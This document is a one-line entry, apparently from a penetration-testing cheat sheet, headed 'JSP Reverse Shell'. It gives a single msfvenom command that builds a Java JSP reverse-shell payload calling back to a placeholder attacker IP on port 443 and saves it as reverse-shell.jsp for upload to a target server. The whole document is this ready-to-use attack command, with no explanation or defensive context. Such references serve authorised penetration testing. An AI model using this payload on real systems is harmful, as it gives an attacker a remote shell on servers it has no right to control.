### JSP Reverse Shell
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKING-IP LPORT=443 -f raw > reverse-shell.jsp
```
